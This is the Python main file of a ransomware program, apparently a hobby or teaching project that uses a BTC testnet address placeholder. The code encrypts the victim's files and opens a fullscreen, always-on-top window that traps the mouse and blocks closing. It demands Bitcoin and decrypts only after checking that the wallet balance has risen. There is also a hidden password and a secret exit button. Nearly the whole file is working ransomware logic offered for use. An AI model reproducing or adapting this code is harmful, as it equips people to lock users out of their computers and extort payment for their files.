import pyautogui                # Import modules

from tkinter import Tk, Label, Button, Frame, BOTH, Entry
from pyautogui import moveTo
from time import sleep
from pygame import mixer

from btc_check import init      # Import functions
from too_bad import no_btc
from cryptor import encrypt, decrypt

# Enter your own BTC testnet address
address = "YOUR-BTC-TESTNET-ADDRESS"        # Wallet BTC testnet address


def malware():
    initial_balance = init(address)         # Get and save the initial balance for this wallet
    print(f"Initial balance: {initial_balance} satoshis")

    encrypt()                               # Encrypt data

    bound_checking = True                   # Bound checking TRUE -> while true, it checks and adjusts mouse position in loop function

    def disable_bounds(_):                  # Disable bounds function -> if the text box is found & correct password is entered, disable bound checking
        nonlocal bound_checking

        if entry.get() == "plz":            # Password = "plz" :-)
            bound_checking = False

    def loop():                             # Loop function
        nonlocal bound_checking

        if bound_checking:                          # If bound checking == TRUE, check & adjust mouse position
            square_width = int(width/5.12)          # Allowed square width
            center_x = pyautogui.size()[0] // 2     # Positions
            center_y = pyautogui.size()[1] // 2
            left = center_x - square_width // 2.5
            right = center_x + square_width // 2.5
            top = center_y - square_width // 2
            bottom = center_y + square_width // 2

            mouse_x, mouse_y = pyautogui.position()     # Get mouse position
            if mouse_x < left or mouse_x > right or mouse_y < top or mouse_y > bottom:      # If out of square:
                moveTo(center_x, center_y)              # Move it back!

        root.attributes("-fullscreen", True)                # Enable fullscreen
        root.attributes("-topmost", True)                   # Enable topmost (Good luck getting to your Task Manager if it opens on the same monitor! >:D)
        root.protocol("WM_DELETE_WINDOW", loop)       # If the user attempts to close the window from the Task Manager
        root.update()                                       # Enable continuous updating of the window
        root.bind('<Return>', disable_bounds)               # Bind the text box to Enter

        root.after(1, loop)


    col1 = '#020f12'                    # Respective colors
    col2 = '#05d7ff'
    col3 = '#65e7ff'
    col4 = 'BLACK'
    col5 = 'WHITE'
    col6 = 'GOLD'
    col7 = '#820f12'
    col8 = '#cd0409'

    root = Tk()                             # Create window
    width = root.winfo_screenwidth()        # Get screen width
    height = root.winfo_screenheight()      # Get screen height
    pyautogui.FAILSAFE = False              # Disable protection of the upper left corner of the screen
    root.title('Need some BTC c:')          # Set the window title
    root.attributes("-fullscreen", True)    # Make the window full-screen
    root.attributes("-topmost", True)       # Enable topmost

    frame = Frame(root, bg=col1, pady=40)   # Create Frame
    frame.pack(fill=BOTH, expand=True)

    entry = Entry(frame, font=('Arial', 5), bg=col1, fg=col5, border=0, cursor='pirate')  # Create entry text field, set its size and location
    entry.place(width=30, height=20, relx=0.5, rely=0.546, anchor='center')

    # --------------------------------------------------------------------------------
    # Label 0 -> if only we were talking about real bitcoins and not testnet ones, eh?
    label0 = Label(
        frame,
        text="⊂(◉‿◉)つ Well I hope you got some spare BTCs... (͡ ° ͜ʖ ͡ °)",
        font=('Arial', int(width/128), 'bold'),
        background=col1,
        foreground=col5
    )
    label0.place(relx=0.5, rely=0.1, anchor='center')

    # ----------------------------
    # Label 1 -> Make your choice!
    label1 = Label(
        frame,
        text="≧◡≦ Make your choice! ≧◡≦",
        font=('Arial', int(width/128), 'bold'),
        background=col1,
        foreground=col5
    )
    label1.place(relx=0.5, rely=0.425, anchor='center')

    # -------------------------------------
    # Label 2 -> Information & Instructions
    label2 = Label(
        frame,
        text="୧༼ಠ益ಠ༽୨   Your files have been ENCRYPTED!   ୧༼ಠ益ಠ༽୨\n\n"
             "Send me some BTC and I might give you your files back   (｡◕‿‿◕｡)\n"
             f"BTC testnet address: {address}",
        font=('Arial', int(width/128), 'bold'),
        background=col1,
        foreground=col6
    )
    label2.place(relx=0.5, rely=0.9, anchor='center')

    # ----------------------------
    # Label 3 -> BTC Wallet Status
    label3 = Label(
        frame,
        text=f"Initial BTC balance:\n → {initial_balance} satoshis\n → {initial_balance / 100000000} BTC",
        font=('Arial', int(width/128), 'bold'),
        background=col1,
        foreground=col6
    )
    label3.place(relx=0.01, rely=0.5)

    # ------------------------------------------------------------
    # Button 0 -> Check whether the transaction has been processed
    button = Button(
        frame,
        background=col2,
        foreground=col4,
        width=int(width / 95),
        height=int(height / 480),
        border=2,
        relief="solid",
        highlightbackground=col4,
        cursor='heart',
        text='Check BTC balance',
        font=('Arial', int(height/90), 'bold'),
        command=lambda: balance_check(initial_balance, root, frame, col1, width)
    )

    def on_enter(_):
        button.config(bg=col3)

    def on_leave(_):
        button.config(bg=col2)

    button.bind("<Enter>", on_enter)
    button.bind("<Leave>", on_leave)

    button.place(relx=0.5, rely=0.5, anchor='center')

    # -------------------------------------------
    # Button 1 -> In case the user has no bitcoin
    button1 = Button(
        frame,
        background=col8,
        foreground=col4,
        width=int(width/95),
        height=int(height/480),
        border=2,
        relief="solid",
        highlightbackground=col1,
        cursor='circle',
        text='I don\'t have BTC ( ͡° ʖ̯ ͡°)',
        font=('Arial', int(height/90), 'bold'),
        command=lambda: no_btc(frame, button2, entry)
    )

    def on_enter(_t):
        button1.config(bg=col7)

    def on_leave(_):
        button1.config(bg=col8)

    button1.bind("<Enter>", on_enter)
    button1.bind("<Leave>", on_leave)

    button1.place(relx=0.5, rely=0.6, anchor='center')

    # ----------------------------------------------------------
    # Button 2 -> Quit (and don't get anything, duh... backdoor)
    def callExit():
        nonlocal root

        decrypt()
        root.destroy()
        exit(0)

    button2 = Button(
        frame,
        background=col1,
        foreground=col2,
        width=int(width / 180),
        height=int(height / 580),
        border=0,
        cursor='trek',
        text='(ง ͠° ͟ʖ ͡°)ง',
        font=('Arial', int(height/90), 'bold'),
        command=callExit
    )
    button2.place(relx=0, rely=1, anchor='sw')

    root.update()   # Enable continuous updates of the window
    sleep(0.2)

    loop()          # Start the loop
    root.mainloop()


def balance_check(initial_balance, root, frame, col1, width):       # Balance check
    current_balance = init(address)                                 # Get the current balance
    print(f"Initial balance: {initial_balance}")
    print(f"Current balance: {current_balance}")
    if current_balance - initial_balance > 0:                       # If at least 1 satoshi has been sent
        for widget in frame.winfo_children():                       # Destroy all widgets on the frame
            widget.destroy()

        label4 = Label(                                             # Create a new "Thank you!" label
            frame,
            text="ヽ༼ຈل͜ຈ༽ﾉ  Thank you!  ヽ༼ຈل͜ຈ༽ﾉ",
            font=('Arial', int(width/56.8), 'bold'),
            background=col1,
            foreground='GREEN'
        )

        audio_file = "media/kaching.mp3"                            # Play "kaChing!"
        mixer.init()
        mixer.music.load(audio_file)
        mixer.music.play()

        label4.place(relx=0.5, rely=0.5, anchor='center')           # Place the label
        frame.update()
        sleep(5)                                                    # Wait for 5 seconds

        decrypt()                                                   # Decrypt files

        root.destroy()                                              # Destroy the root
        exit(0)                                                     # Exit

    else:                                                           # Otherwise the user is lying and wants to get their files back for free! >:(
        label4 = Label(                                             # Create a new label
            frame,
            text="•`_´• No BTC deposited! •`_´•",
            font=('Arial', int(width/160), 'bold'),
            background=col1,
            foreground='RED'
        )
        label4.place(relx=0.5, rely=0.7, anchor='center')

        audio_file = "media/nope.mp3"                               # Play the "Nope!" sound
        mixer.init()
        mixer.music.load(audio_file)
        mixer.music.play()
